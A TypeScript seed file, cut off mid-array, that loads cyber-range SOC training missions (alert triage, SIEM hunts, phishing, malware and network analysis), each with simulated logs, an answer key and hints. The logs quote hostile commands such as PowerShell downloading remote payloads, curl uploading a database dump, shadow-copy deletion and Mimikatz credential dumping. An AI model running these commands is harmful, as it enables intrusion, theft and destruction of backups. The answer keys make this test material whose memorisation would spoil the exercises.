import { prisma } from "../../lib/prisma";
import { runSeedIfMain } from "./lib/runIfMain";

export async function seedCyberRangePack001() {
  await prisma.mission.deleteMany({
    where: { slug: { startsWith: "cr001-" } }
  });

  await prisma.mission.createMany({
    skipDuplicates: true,
    data: [
      // ── SOC_ALERT (5) ──────────────────────────────────────────────
      {
        title: "Failed Login Investigation",
        slug: "cr001-soc-failed-login",
        type: "SOC_ALERT",
        category: "Identity & Access",
        difficulty: "Beginner",
        description:
          "Triage repeated authentication failures against a privileged account.",
        scenario:
          "The IAM team escalated alert SOC-4412: 847 failed logins against svc-backup over 12 minutes from a single external IP. No successful authentication yet. Determine the attack classification.",
        content: `
[ALERT] SOC-4412 | Severity: HIGH | Source: Azure AD Sign-in Logs
Time (UTC)     User          IP             Result           Risk
06:12:01       svc-backup    89.47.112.33   Failure (50126)  Anonymous IP
06:12:02       svc-backup    89.47.112.33   Failure (50126)  Password spray pattern
06:12:03       svc-backup    89.47.112.33   Failure (50126)  Password spray pattern
...
06:24:18       svc-backup    89.47.112.33   Failure (50126)  847 attempts total

Geo: IP resolves to Bucharest, RO — no corporate travel on record.
MITRE hint: T1110 — Credential Access
        `,
        answer: "brute force",
        explanation:
          "Hundreds of sequential failed authentications against one service account from a single external IP indicate an automated brute force or password spray attack (MITRE T1110).",
        hints: [
          "Count how many authentication attempts failed and whether any succeeded.",
          "The MITRE tag T1110 in the logs maps to Credential Access techniques.",
          "Name the attack where one IP repeatedly guesses passwords against a single account."
        ],
        xp: 100
      },
      {
        title: "Impossible Travel Alert",
        slug: "cr001-soc-impossible-travel",
        type: "SOC_ALERT",
        category: "Identity & Access",
        difficulty: "Beginner",
        description:
          "Investigate a sign-in that violates geographic velocity rules.",
        scenario:
          "Conditional Access flagged impossible travel for analyst jsmith@nexuscorp.com. Two successful MFA-approved sessions appeared 42 minutes apart from different continents.",
        content: `
[ALERT] SOC-4488 | Severity: CRITICAL | Source: Microsoft Entra ID
Session 1:
  Time:   2026-06-18 08:14 UTC
  IP:     203.0.113.44
  City:   Sydney, AU
  Device: CORP-LT-0192 (managed)
  MFA:    Approved via Authenticator

Session 2:
  Time:   2026-06-18 08:56 UTC
  IP:     198.51.100.88
  City:   London, UK
  Device: Unknown Android (unmanaged)
  MFA:    Approved via SMS (number changed 08:52 UTC)

Distance: ~17,000 km in 42 minutes — physically impossible without credential compromise.
        `,
        answer: "impossible travel",
        explanation:
          "Successful logins from geographically distant locations within an impossible timeframe strongly indicate stolen credentials and session token abuse — classic impossible travel (often paired with MFA fatigue or SIM swap).",
        hints: [
          "Compare the cities and timestamps of both successful sessions.",
          "Conditional Access flagged this because geographic velocity is physically unrealistic.",
          "Use the alert name — two words describing logins from distant locations too quickly."
        ],
        xp: 100
      },
      {
        title: "Suspicious Admin Creation",
        slug: "cr001-soc-admin-creation",
        type: "SOC_ALERT",
        category: "Privilege Abuse",
        difficulty: "Intermediate",
        description:
          "A new Global Administrator appeared outside the change window.",
        scenario:
          "PIM audit detected an unauthorized admin account created at 02:17 UTC — outside the approved maintenance window. The creating account belongs to a helpdesk tier-1 user.",
        content: `
[ALERT] SOC-4521 | Severity: HIGH | Source: Entra ID Audit Logs
Event: Add member to role
  Target role:   Global Administrator
  Target user:   svc-update-admin (NEW — created 02:16 UTC)
  Initiated by:  helpdesk-jdoe@nexuscorp.com
  IP:            185.234.88.19 (Tor exit node)
  User agent:    python-requests/2.31.0

Prior activity (same session):
  02:14 — helpdesk-jdoe password changed (self-service, unusual hour)
  02:15 — MFA device registered (new phone)
  02:16 — User svc-update-admin created
  02:17 — Global Admin role assigned

Change ticket: NONE open for this window.
        `,
        answer: "unauthorized admin",
        explanation:
          "Creation of a Global Administrator by a helpdesk account from a Tor IP using a script user-agent, with no change ticket, indicates account takeover followed by unauthorized admin provisioning.",
        hints: [
          "Check who created the new Global Administrator and whether a change ticket exists.",
          "The creating account is tier-1 helpdesk — they should not assign Global Admin roles.",
          "Classify the incident: two words — the admin account was created without approval."
        ],
        xp: 250
      },
      {
        title: "Privilege Escalation Detected",
        slug: "cr001-soc-privilege-escalation",
        type: "SOC_ALERT",
        category: "Privilege Abuse",
        difficulty: "Intermediate",
        description:
          "Endpoint alert shows a standard user spawning a SYSTEM-level process.",
        scenario:
          "CrowdStrike Falcon flagged privilege escalation on workstation FIN-WS-004. A finance analyst's session spawned an elevated child process within seconds of opening a macro-enabled spreadsheet.",
        content: `
[ALERT] SOC-4602 | Severity: CRITICAL | Source: EDR / Falcon
Host:     FIN-WS-004
User:     FIN\\a.martinez (standard user)
Parent:   EXCEL.EXE — Q2_Budget_Final.xlsm (macro enabled)
Child:    cmd.exe /c whoami & net localgroup administrators a.martinez /add
Token:    Integrity elevated SYSTEM → Administrators group modified

Timeline:
  14:22:01  Excel opened macro document from \\\\temp-share\\budget.xlsm
  14:22:04  VBA macro executed: Shell("powershell -enc ...")
  14:22:06  User added to local Administrators group
  14:22:09  reg.exe — Run key persistence attempted

MITRE: T1548 Abuse Elevation Control Mechanism
        `,
        answer: "privilege escalation",
        explanation:
          "A standard user account gaining local administrator rights via a macro-launched shell is textbook privilege escalation (MITRE T1548), typically the second stage after initial access.",
        hints: [
          "Trace what happened after the macro-enabled Excel file was opened.",
          "A standard user was added to the local Administrators group — that is an elevation of rights.",
          "Submit the two-word term for when a user gains higher privileges than assigned."
        ],
        xp: 250
      },
      {
        title: "Suspicious Service Installation",
        slug: "cr001-soc-suspicious-service",
        type: "SOC_ALERT",
        category: "Persistence",
        difficulty: "Advanced",
        description:
          "Windows Event 7045 logged an unknown service with a binary in Temp.",
        scenario:
          "Sysmon Event ID 7045 fired on DC-WIN-02. A service named 'WindowsHealthMonitor' was installed pointing to an executable in the user Temp folder — not a known vendor path.",
        content: `
[ALERT] SOC-4710 | Severity: HIGH | Source: Sysmon / Windows Event Log
Event ID: 7045 — Service Installed
  Service Name:    WindowsHealthMonitor
  Display Name:    Windows Health Monitor Service
  Image Path:      C:\\Users\\Public\\Temp\\whm.exe
  Start Type:      Auto (boot)
  Account:         LocalSystem
  SHA256:          a3f2...9c01 (0/72 VT detections at install time)

Prior on host:
  03:41 — PowerShell -enc (Sysmon 1)
  03:42 — whm.exe written to Temp (Sysmon 11)
  03:43 — sc.exe create WindowsHealthMonitor (Sysmon 1)
  03:44 — Service started, outbound TCP 443 to 194.26.27.82

Legitimate Windows services never install from Users\\Public\\Temp.
        `,
        answer: "suspicious service",
        explanation:
          "A newly installed auto-start service executing from a Temp directory with no vendor signature, following encoded PowerShell, is a common persistence technique (MITRE T1543.003) and indicates compromise.",
        hints: [
          "Inspect the Image Path of the newly installed WindowsHealthMonitor service.",
          "Legitimate services do not install binaries from Users\\Public\\Temp.",
          "Describe the finding in two words — an untrusted Windows service was installed."
        ],
        xp: 500
      },

      // ── SIEM (5) ───────────────────────────────────────────────────
      {
        title: "Brute Force Detection",
        slug: "cr001-siem-brute-force",
        type: "SIEM",
        category: "Threat Detection",
        difficulty: "Beginner",
        description:
          "Query auth logs to identify a password-guessing campaign.",
        scenario:
          "Splunk correlation search 'AUTH-BRUTE-001' returned 1,200+ events in 30 minutes targeting the VPN gateway. Identify the attack type.",
        content: `
index=auth sourcetype=vpn_logs earliest=-30m
| stats count by src_ip, user, action
| where action="FAIL"

Top results:
  src_ip=45.33.21.10   user=administrator   count=412   action=FAIL
  src_ip=45.33.21.10   user=root            count=398   action=FAIL
  src_ip=45.33.21.10   user=backup          count=390   action=FAIL

Single source IP rotating through common privileged usernames.
No successful auth from this IP in the window.

Suggested query: index=auth failed | stats count by src_ip
        `,
        answer: "brute force",
        explanation:
          "One IP attempting hundreds of logins across multiple privileged account names is a brute force attack (MITRE T1110.001) against the VPN perimeter.",
        hints: [
          "One source IP tried many different privileged usernames — all failed.",
          "This is a MITRE T1110 sub-technique against the VPN gateway.",
          "Two-word answer: automated password guessing from a single IP."
        ],
        xp: 100
      },
      {
        title: "PowerShell Attack Analysis",
        slug: "cr001-siem-powershell",
        type: "SIEM",
        category: "Endpoint Security",
        difficulty: "Intermediate",
        description:
          "Hunt encoded PowerShell in process creation logs.",
        scenario:
          "Defender forwarded Event ID 4688 anomalies to the SIEM. An encoded command bypassed AMSI on HR-WS-112.",
        content: `
index=windows EventCode=4688 process_name=powershell.exe
| search CommandLine="*-enc*" OR CommandLine="*-EncodedCommand*"

06:33:12  HR-WS-112  powershell.exe
  CommandLine: powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand
    JABjAGwAaQBlA... (truncated, 4,812 chars)
  Parent:   WINWORD.EXE
  User:     HR\\klee

Decoded payload (sandbox):
  IEX (New-Object Net.WebClient).DownloadString('http://185.234.88.19/p')
  MITRE technique tag in rule: T1059.001

What MITRE technique ID matches this attack?
        `,
        answer: "t1059",
        explanation:
          "PowerShell used as a command interpreter to download and execute remote code maps to MITRE T1059.001 (PowerShell). The -EncodedCommand flag is a common evasion pattern.",
        hints: [
          "The parent process is WINWORD.EXE — document-delivered payload.",
          "The evidence asks for the MITRE technique ID for PowerShell as a command interpreter.",
          "Submit the technique ID in the format t#### (lowercase)."
        ],
        xp: 250
      },
      {
        title: "Suspicious DNS Activity",
        slug: "cr001-siem-suspicious-dns",
        type: "SIEM",
        category: "Network Detection",
        difficulty: "Intermediate",
        description:
          "Identify DNS queries consistent with malware C2 beaconing.",
        scenario:
          "Zeek DNS logs show a workstation resolving unusually long subdomain labels at fixed intervals.",
        content: `
index=dns sourcetype=zeek:dns
| where query_length > 50
| stats count avg(interval_sec) by src_ip, query

Results:
  src_ip=10.0.4.55
  query_pattern=*.a7f3b2e9d1c8.data-sync.azure-update[.]net
  count=480 queries / 8 hours
  avg_interval=60 seconds (regular beacon)

Sample queries:
  YWRtaW4=.a7f3b2e9d1c8.data-sync.azure-update.net  (base64-like label)
  cGF5bG9h.a7f3b2e9d1c8.data-sync.azure-update.net

Domain registered 3 days ago. Legitimate Azure domains do not use this pattern.
        `,
        answer: "dns tunneling",
        explanation:
          "High-entropy subdomain labels at regular 60-second intervals with base64-encoded prefixes indicate DNS tunneling used for C2 exfiltration or beaconing (MITRE T1071.004).",
        hints: [
          "Queries repeat every 60 seconds with unusually long, random-looking subdomain labels.",
          "Base64-like labels suggest data is encoded inside DNS queries.",
          "Two-word answer: covert data transfer hidden inside DNS requests."
        ],
        xp: 250
      },
      {
        title: "Data Exfiltration Hunt",
        slug: "cr001-siem-data-exfil",
        type: "SIEM",
        category: "Data Loss Prevention",
        difficulty: "Advanced",
        description:
          "Correlate proxy and firewall logs to find outbound data theft.",
        scenario:
          "DLP flagged an anomalous 4.2 GB HTTPS upload from a database server that never talks to the internet directly.",
        content: `
index=proxy OR index=firewall earliest=-6h

Proxy (10.0.8.12 — SQL-PROD-01):
  22:14–23:58  dest=194.26.27.82:443  bytes_out=4,217,883,520  method=POST
  User-Agent: curl/7.88.1
  URI: /upload/chunk/*

Firewall (same window):
  10.0.8.12 → 194.26.27.82:443  ALLOW (new destination, first seen)

Host process (Sysmon on SQL-PROD-01):
  sqlservr.exe → cmd.exe → curl.exe -T C:\\temp\\dump.bak

No approved backup job scheduled. Destination IP flagged by Threat Intel (TA505 infra).
        `,
        answer: "data exfiltration",
        explanation:
          "A database server uploading 4.2 GB via curl to a known malicious IP outside business hours, with no change ticket, is active data exfiltration (MITRE T1041 / T1567).",
        hints: [
          "SQL-PROD-01 should not upload gigabytes to the internet via curl.",
          "Over 4 GB was POSTed to a threat-intel flagged IP with no backup ticket.",
          "Two-word answer: stolen data leaving the organization."
        ],
        xp: 500
      },
      {
        title: "Malware Beaconing Pattern",
        slug: "cr001-siem-malware-beacon",
        type: "SIEM",
        category: "Threat Detection",
        difficulty: "Advanced",
        description:
          "Detect periodic C2 heartbeat traffic in NetFlow data.",
        scenario:
          "The NDR platform surfaced jitter-beaconing from an IoT subnet. NetFlow shows metronome-like HTTPS callbacks.",
        content: `
index=netflow src_net=10.0.50.0/24 earliest=-24h
| transaction src_ip dest_ip maxpause=120s
| where eventcount > 100

Match:
  src=10.0.50.47 (IP camera NVR)
  dest=185.234.88.19:443
  events=288 / 24h
  interval=300s ± 8s jitter (beacon signature)
  bytes_out=64 bytes (consistent heartbeat size)
  JA3=6734fbd2... (matches Emotet family fingerprint in TI feed)

No legitimate NVR vendor communicates with this destination.
        `,
        answer: "beaconing",
        explanation:
          "Regular 5-minute HTTPS callbacks with fixed payload size and known malicious JA3 fingerprint indicate malware C2 beaconing (MITRE T1071.001) from a compromised IoT device.",
        hints: [
          "Traffic repeats every 300 seconds with consistent 64-byte payloads.",
          "The JA3 fingerprint matches a known Emotet family in the TI feed.",
          "One-word answer: periodic C2 heartbeat traffic from malware."
        ],
        xp: 500
      },

      // ── PHISHING (5) ───────────────────────────────────────────────
      {
        title: "Credential Theft Email",
        slug: "cr001-phish-credential-theft",
        type: "PHISHING",
        category: "Email Security",
        difficulty: "Beginner",
        description:
          "Analyze a reported password-expiry phish targeting executives.",
        scenario:
          "The CFO forwarded a suspicious 'Microsoft 365 Password Expiry' message. Headers and link destination need review.",
        content: `
From:     IT Support <support@micros0ft-login[.]com>   (zero, not 'o')
Reply-To: helpdesk@secure-auth-portal[.]net
Subject:  ACTION REQUIRED: Password expires in 24 hours

Body link: https://micros0ft-login[.]com/verify?user=cfo@nexuscorp.com
URL scan:  New domain (2 days old), SSL by Let's Encrypt, cloned O365 login page
SPF:       FAIL (sending IP 89.47.112.33 not authorized)
DMARC:     FAIL

No Microsoft notification uses micros0ft-login.com.
        `,
        answer: "phishing",
        explanation:
          "Typosquatted domain, SPF/DMARC failures, and a cloned login page designed to harvest credentials are definitive phishing indicators.",
        hints: [
          "Compare the sender domain to the real Microsoft domain — look for character substitution.",
          "SPF and DMARC both failed; the link leads to a cloned login page.",
          "One-word answer: the classic email attack that steals credentials."
        ],
        xp: 100
      },
      {
        title: "Fake Invoice Scam",
        slug: "cr001-phish-fake-invoice",
        type: "PHISHING",
        category: "Email Security",
        difficulty: "Beginner",
        description:
          "Accounts payable received a fraudulent vendor invoice.",
        scenario:
          "AP clerk flagged an urgent wire-transfer request attached as a PDF invoice from a 'new vendor banking update'.",
        content: `
From:     accounts@vendor-acme-payments[.]co  (not acmecorp.com)
Subject:  URGENT: Updated banking details — Invoice #INV-2026-8841

Attachment: Invoice_8841.pdf.exe  (double extension)
  Magic bytes: MZ (PE executable disguised as PDF)
  VT: 38/72 detections — Trojan:Win32/AgentTesla

Body: "Our bank account changed. Wire $48,500 to the new account by EOD."
Reply-to differs from From domain.
No PO match in ERP for INV-2026-8841.
        `,
        answer: "invoice fraud",
        explanation:
          "A double-extension executable attachment combined with urgent payment redirection to unknown banking details is invoice fraud — a social-engineering phishing variant targeting finance teams.",
        hints: [
          "Inspect the attachment extension carefully — .pdf.exe is a red flag.",
          "The email pushes an urgent wire transfer to new banking details with no matching PO.",
          "Two-word answer: fraudulent payment request disguised as a vendor invoice."
        ],
        xp: 100
      },
      {
        title: "QR Code Phishing",
        slug: "cr001-phish-qr-phishing",
        type: "PHISHING",
        category: "Email Security",
        difficulty: "Intermediate",
        description:
          "Identify quishing — phishing delivered via QR code.",
        scenario:
          "Facilities staff received a parking-permit renewal email with a QR code instead of a hyperlink. Mobile devices bypassed URL filtering.",
        content: `
From:     parking@city-permits-verify[.]org
Subject:  Scan to renew your 2026 parking permit — expires today

Body: Embedded QR code image (no clickable URL — evades email gateway link rewrite)
QR resolves to: https://city-permits-verify[.]org/auth?id=scan
Mobile scan result: Fake Microsoft login, requests O365 credentials
Threat tag: Quishing / QR phishing (CISA advisory AA23-061A)

Desktop URL scanners: CLEAN (no link in body to inspect)
Mobile users: 14 credential submissions before block
        `,
        answer: "qr phishing",
        explanation:
          "Embedding malicious URLs in QR codes (quishing) evades traditional email link analysis and targets mobile users who lack the same security controls.",
        hints: [
          "There is no clickable hyperlink — only an embedded image in the email body.",
          "Mobile scanners bypassed URL rewrite rules that protect desktop users.",
          "Two-word answer: phishing delivered via a scannable QR code."
        ],
        xp: 250
      },
      {
        title: "Attachment Malware Delivery",
        slug: "cr001-phish-attachment-malware",
        type: "PHISHING",
        category: "Email Security",
        difficulty: "Intermediate",
        description:
          "Dissect a shipping-notification phish delivering malware.",
        scenario:
          "An HR generalist opened a 'FedEx delivery failure' email. The macro-enabled attachment triggered EDR within 90 seconds.",
        content: `
From:     noreply@fedex-delivery-alert[.]com
Subject:  Package delivery failed — open attached customs form

Attachment: Customs_Form.docm
  Macro: AutoOpen() → powershell -w hidden IEX(...download...)
  Sandbox detonation: Drops Remcos RAT to %AppData%\\svchost.exe
  C2: 194.26.27.82:8080

Email body uses FedEx branding; domain registered yesterday.
SPF pass (compromised sender relay) — DMARC alignment fail.
        `,
        answer: "malware",
        explanation:
          "A macro-enabled document from a typosquatted courier domain that drops a remote access trojan is phishing-as-initial-access delivering malware (MITRE T1566.001).",
        hints: [
          "The attachment is a .docm file with an AutoOpen macro.",
          "Sandbox detonation shows Remcos RAT dropped to disk.",
          "One-word answer: malicious software delivered by email."
        ],
        xp: 250
      },
      {
        title: "Business Email Compromise",
        slug: "cr001-phish-bec",
        type: "PHISHING",
        category: "Email Security",
        difficulty: "Advanced",
        description:
          "Investigate a CEO fraud wire-transfer request.",
        scenario:
          "Treasury received an email appearing from the CEO requesting an urgent confidential acquisition wire. No phone callback was performed.",
        content: `
From:     ceo@nexuscorp.com  (display name: James Carter, CEO)
          Actual header: via sendgrid.net — Reply-To: ceo-urgent@nexus-deal-room[.]com
Subject:  Confidential — Wire $2.1M to escrow (do not discuss)

Body tone: Matches CEO writing style (likely scraped from prior breach)
Rule bypass: Sent during CEO's known flight window (no callback possible)
Mailbox: ceo@ compromised 72h earlier (forward rule to attacker inbox)

Forensics: Attacker read 6 months of email threads before sending.
No acquisition in progress. Escrow account in different country.
        `,
        answer: "business email compromise",
        explanation:
          "Spoofed or compromised executive email requesting urgent confidential wire transfer with reply-to mismatch is classic Business Email Compromise (BEC / CEO fraud) — MITRE T1656.",
        hints: [
          "Check Reply-To vs From — they point to different domains.",
          "The CEO's mailbox was compromised days before this urgent wire request.",
          "Three-word answer: executive impersonation wire fraud scheme."
        ],
        xp: 500
      },

      // ── MALWARE (5) ────────────────────────────────────────────────
      {
        title: "Ransomware Behavior Analysis",
        slug: "cr001-malware-ransomware",
        type: "MALWARE",
        category: "Endpoint",
        difficulty: "Beginner",
        description:
          "Identify ransomware activity from EDR process telemetry.",
        scenario:
          "EDR quarantined a process on ENG-WS-033. File-encryption activity spiked across mapped drives within 4 minutes.",
        content: `
Process tree (ENG-WS-033):
  outlook.exe → invoice_042.exe → vssadmin.exe delete shadows /all /quiet
                              → wbadmin delete catalog -quiet
                              → encrypt.exe (renamed: svchost.exe)

File events (4 min window):
  *.docx → *.docx.LOCKED (4,812 files)
  *.xlsx → *.xlsx.LOCKED
  ransom note dropped: README_DECRYPT.txt

Network: Tor exit node connection attempted post-encryption
Note text: "Your files have been encrypted. Send 2 BTC to..."
        `,
        answer: "ransomware",
        explanation:
          "Shadow copy deletion, mass file extension renaming, and a ransom note are hallmark ransomware behaviors (MITRE T1486). vssadmin abuse precedes encryption to prevent recovery.",
        hints: [
          "Look for vssadmin and wbadmin commands — attackers delete backups before encrypting.",
          "Thousands of files were renamed with a .LOCKED extension and a ransom note appeared.",
          "One-word answer: malware that encrypts files and demands payment."
        ],
        xp: 100
      },
      {
        title: "Suspicious Process Investigation",
        slug: "cr001-malware-suspicious-process",
        type: "MALWARE",
        category: "Endpoint",
        difficulty: "Intermediate",
        description:
          "Find the malicious process masquerading as a system binary.",
        scenario:
          "Live response on SRV-WEB-01 shows an unsigned binary running from an unusual path with network connections.",
        content: `
Tasklist /v (filtered):
  PID   Image                          Path                                    Signed
  884   svchost.exe                    C:\\Windows\\System32\\svchost.exe       Microsoft ✓
  1204  svchost.exe                    C:\\Users\\Public\\svchost.exe           UNSIGNED ✗
  445   explorer.exe                   C:\\Windows\\explorer.exe                Microsoft ✓

PID 1204 connections:
  TCP 10.0.2.15:49152 → 185.234.88.19:4444 ESTABLISHED

Parent of PID 1204: w3wp.exe (IIS worker — web shell upload suspected)
Command line: C:\\Users\\Public\\svchost.exe -k netsvcs
        `,
        answer: "svchost.exe",
        explanation:
          "Legitimate svchost.exe only runs from System32. An unsigned copy in Users\\Public with outbound C2 on port 4444 is a masquerading malicious process.",
        hints: [
          "Two processes share the name svchost.exe — compare their paths and signatures.",
          "The unsigned copy connects to 185.234.88.19:4444 and was spawned from w3wp.exe.",
          "Submit the exact process name (including extension) that is malicious."
        ],
        xp: 250
      },
      {
        title: "Persistence Mechanism Hunt",
        slug: "cr001-malware-persistence",
        type: "MALWARE",
        category: "Endpoint",
        difficulty: "Intermediate",
        description:
          "Locate the registry run key maintaining attacker access.",
        scenario:
          "After removing obvious malware, the host re-infects on every reboot. Autoruns analysis is required.",
        content: `
Autoruns scan — DEV-WS-019:

HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
  OneDrive Update    REG_SZ    "C:\\Users\\dev\\AppData\\Roaming\\onedrive.exe"
    SHA256: unknown (not Microsoft OneDrive)
    First seen: 3 days ago (post-phish)
    VT: 41/72 — Backdoor:Win32/Zegost

HKLM\\...\\Run (clean)
Scheduled Tasks (clean)
Services: WindowsUpdateHelper → same binary path

Binary opens reverse shell to 89.47.112.33:443 on login.
        `,
        answer: "persistence",
        explanation:
          "A Run key pointing to a non-Microsoft binary in AppData\\Roaming that re-establishes C2 on login is a standard persistence mechanism (MITRE T1547.001 — Registry Run Keys).",
        hints: [
          "The host re-infects on every reboot — check autorun locations.",
          "HKCU\\...\\Run contains a fake OneDrive Update pointing to AppData\\Roaming.",
          "One-word answer: the MITRE phase where attackers maintain long-term access."
        ],
        xp: 250
      },
      {
        title: "C2 Connection Analysis",
        slug: "cr001-malware-c2-connection",
        type: "MALWARE",
        category: "Network",
        difficulty: "Advanced",
        description:
          "Trace command-and-control traffic from an infected endpoint.",
        scenario:
          "Threat intel matched outbound HTTPS from LAPTOP-SALES-07 to a known Cobalt Strike staging server.",
        content: `
Packet capture summary (LAPTOP-SALES-07):

Connection 1:
  dest: 194.26.27.82:443
  SNI:  cdn-static.azureedge-update[.]com  (typosquat)
  JA3:  e7d705a3286e19ea42f527b566ec113d (Cobalt Strike default)
  Interval: 60s beacon, 64-byte payloads

Process: rundll32.exe (no command-line args — hollowed)
  Parent: WINWORD.EXE (macro doc opened 09:12)
  Injected thread into explorer.exe

TI feed: IP linked to APT29 infrastructure (confidence: high)
        `,
        answer: "c2",
        explanation:
          "Periodic HTTPS beacons to a typosquatted domain with Cobalt Strike JA3 fingerprint, originating from a hollowed rundll32 process, confirm active command-and-control (MITRE T1071.001).",
        hints: [
          "HTTPS callbacks repeat every 60 seconds to a typosquatted Azure CDN domain.",
          "The JA3 hash matches Cobalt Strike default staging infrastructure.",
          "Short answer: the abbreviation for command-and-control traffic."
        ],
        xp: 500
      },
      {
        title: "Encoded Command Detection",
        slug: "cr001-malware-encoded-command",
        type: "MALWARE",
        category: "Endpoint",
        difficulty: "Advanced",
        description:
          "Decode and classify a Base64-encoded PowerShell attack.",
        scenario:
          "Sysmon logged process creation with a 6 KB encoded command on a domain controller — critical severity.",
        content: `
Sysmon Event ID 1:
  Image:       powershell.exe
  CommandLine: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi...
  User:        NT AUTHORITY\\SYSTEM
  Parent:      services.exe

Decoded (truncated):
  IEX (New-Object Net.WebClient).DownloadString('http://185.234.88.19/stage2.ps1')
  Invoke-Mimikatz -DumpCreds

Host: DC-WIN-01 (domain controller)
Prior: PsExec from 10.0.4.22 (compromised jump box)

Classification needed: what evasion technique is the -enc flag?
        `,
        answer: "encoded command",
        explanation:
          "The -EncodedCommand (-enc) flag obfuscates malicious PowerShell to evade signature-based detection and logging review — a common living-off-the-land technique before credential dumping.",
        hints: [
          "The PowerShell command line contains a very long -enc argument on a domain controller.",
          "Decoding reveals Invoke-Mimikatz — the flag hides the payload from casual log review.",
          "Two-word answer: the obfuscation technique used by the -enc flag."
        ],
        xp: 500
      },

      // ── NETWORK (5) ────────────────────────────────────────────────
      {
        title: "Port Scan Detection",
        slug: "cr001-net-port-scan",
        type: "NETWORK",
        category: "Network Security",
        difficulty: "Beginner",
        description:
          "Identify reconnaissance activity in firewall deny logs.",
        scenario:
          "The perimeter IDS triggered on a /24 sweep against the DMZ. Analyst must classify the activity.",
        content: `
Firewall deny log (last 15 min):
  src=45.33.21.10
  dst=203.0.113.0/24 (DMZ)
  ports=21,22,23,25,80,443,445,3389,8080 (sequential sweep)
  action=DENY
  count=2,560 events

Pattern: SYN packets to 320 hosts × 8 ports in 900 seconds
No successful connections.
Shodan: Source IP flagged as known scanner (Censys/Shodan bot).

What type of reconnaissance is this?
        `,
        answer: "port scan",
        explanation:
          "Sequential SYN probes across multiple hosts and common ports from an external scanner IP is network reconnaissance via port scanning (MITRE T1046).",
        hints: [
          "One external IP hit 320 hosts across 8 common ports in 15 minutes — all denied.",
          "The pattern is SYN probes with no successful connections (MITRE T1046).",
          "Two-word answer: reconnaissance that discovers open services on hosts."
        ],
        xp: 100
      },
      {
        title: "Suspicious Outbound Connection",
        slug: "cr001-net-suspicious-connection",
        type: "NETWORK",
        category: "Network Security",
        difficulty: "Beginner",
        description:
          "Review NetFlow for an unexpected outbound session.",
        scenario:
          "A print server initiated HTTPS to an IP in a high-risk geography — print servers should only talk to vendor update servers.",
        content: `
NetFlow record:
  src=10.0.6.50 (PRINT-SRV-01)
  dest=89.47.112.33:443
  country=RO
  bytes_out=12,482,880 (12 MB upload)
  duration=4h 22m
  first_seen: never before in 90-day baseline

Process (EDR): spoolsv.exe → unknown DLL loaded → outbound HTTPS
TI: 89.47.112.33 — AsyncRAT C2 (confidence 92%)

Legitimate print traffic: vendor.hp.com, 443, ~50 KB/day.
        `,
        answer: "suspicious connection",
        explanation:
          "A print server uploading 12 MB to a known RAT C2 IP in Romania with no historical baseline is a suspicious outbound connection indicating compromise.",
        hints: [
          "PRINT-SRV-01 has no 90-day baseline to this Romanian IP.",
          "spoolsv.exe loaded an unknown DLL and uploaded 12 MB over 4 hours.",
          "Two-word answer: classify this unexpected outbound session."
        ],
        xp: 100
      },
      {
        title: "Unusual Traffic Analysis",
        slug: "cr001-net-unusual-traffic",
        type: "NETWORK",
        category: "Network Security",
        difficulty: "Intermediate",
        description:
          "Detect anomalous SMB traffic crossing subnet boundaries.",
        scenario:
          "Network analytics flagged east-west SMB traffic at 03:00 from a workstation to multiple file servers — unusual for this user's role.",
        content: `
NDR alert — lateral SMB activity:
  src=10.0.4.55 (MARKETING-WS-12, user: intern-guest)
  dst=10.0.8.0/24 (file servers, 14 hosts)
  protocol=SMB2
  port=445
  window=03:00–03:47 UTC
  files_accessed=2,847 (mostly .docx, .xlsx, .pst)
  bytes_out=890 MB

User role: Marketing intern — no file-server access in RBAC
Auth: NTLM pass-the-hash (Event 4624 logon type 3, NTLM v1)

Baseline: This host averages 0 SMB sessions/week to file servers.
        `,
        answer: "unusual traffic",
        explanation:
          "A marketing workstation accessing 14 file servers overnight via NTLM pass-the-hash, exfiltrating nearly 900 MB, is highly anomalous east-west traffic indicating lateral movement and data staging.",
        hints: [
          "An intern's workstation accessed 14 file servers at 03:00 — far outside their RBAC.",
          "890 MB of documents were read via SMB with NTLM pass-the-hash authentication.",
          "Two-word answer: traffic that deviates sharply from the host's normal baseline."
        ],
        xp: 250
      },
      {
        title: "DNS Tunneling Investigation",
        slug: "cr001-net-dns-tunneling",
        type: "NETWORK",
        category: "Network Security",
        difficulty: "Advanced",
        description:
          "Analyze DNS query patterns hiding exfiltrated data.",
        scenario:
          "Cloud DNS logging showed a single host generating 40,000 TXT queries per day to one domain.",
        content: `
DNS analytics (24h):
  src=10.0.12.88 (CI-PIPELINE-04 — build server)
  domain=sync-updates.cloud-cdn[.]net
  query_type=TXT
  count=39,842
  avg_label_entropy=4.7 bits (high — random data)
  avg_query_size=180 bytes (normal: 30–50)

Sample TXT responses decode to fragmented base64 → reassembled 2.3 GB archive
Destination NS: bulletproof hoster (known exfil infra)

Build servers should not generate 40K TXT lookups/day.
        `,
        answer: "dns tunneling",
        explanation:
          "High-volume TXT queries with high-entropy labels to a newly registered domain, reassembling into gigabytes of data, is DNS tunneling used for covert exfiltration (MITRE T1071.004).",
        hints: [
          "A build server issued nearly 40,000 TXT queries in one day — far above normal.",
          "High label entropy and 180-byte query sizes suggest encoded payloads in DNS.",
          "Two-word answer: covert data transfer via DNS TXT records."
        ],
        xp: 500
      },
      {
        title: "Lateral Movement Trace",
        slug: "cr001-net-lateral-movement",
        type: "NETWORK",
        category: "Network Security",
        difficulty: "Advanced",
        description:
          "Follow an attacker's path across internal hosts using authentication logs.",
        scenario:
          "Incident commander needs the technique used to pivot from the initial beachhead to the domain controller.",
        content: `
Auth log chain (72h incident):

1. 10.0.4.22 (VPN beachhead) — phished user login
2. 10.0.4.22 → 10.0.8.12 (SQL-PROD-01) via WMI + stolen hash (Event 4624 type 3)
3. 10.0.8.12 → 10.0.8.50 (BACKUP-SRV) via PsExec (ADMIN$ share)
4. 10.0.8.50 → 10.0.2.10 (DC-WIN-01) via DCSync attempt (Event 4662)

Tools observed: mimikatz, crackmapexec, Cobalt Strike beacons
All hops use NTLM Pass-the-Hash — no new interactive logons.

What attack phase describes hops 2–4?
        `,
        answer: "lateral movement",
        explanation:
          "Pivoting from a beachhead host to database, backup, and domain controller servers using pass-the-hash and remote execution is lateral movement (MITRE T1021) within the post-exploitation phase.",
        hints: [
          "Follow the auth log chain from VPN beachhead through SQL, backup, and DC hosts.",
          "Each hop uses stolen hashes — WMI, PsExec, and DCSync — not new phishing.",
